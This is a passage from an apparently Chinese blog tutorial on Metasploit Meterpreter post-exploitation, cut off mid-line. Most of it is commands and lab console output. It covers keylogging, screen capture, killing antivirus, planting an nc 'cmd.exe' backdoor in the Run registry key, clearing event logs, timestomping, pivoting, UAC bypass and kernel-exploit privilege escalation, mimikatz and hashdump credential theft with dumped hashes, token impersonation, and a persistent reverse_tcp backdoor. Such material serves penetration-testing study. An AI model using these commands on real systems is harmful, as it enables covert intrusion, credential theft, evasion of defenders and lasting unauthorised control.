#通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令-3"><a href="#4-2-文件系统命令-3" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-3"><a href="#4-3-网络命令-3" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-3"><a href="#4-4-信息收集-3" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-3"><a href="#4-5-提权-3" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-3"><a href="#4-6-获取凭证-3" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌-3"><a href="#4-7-假冒令牌-3" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门-3"><a href="#4-8-植入后门-3" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as 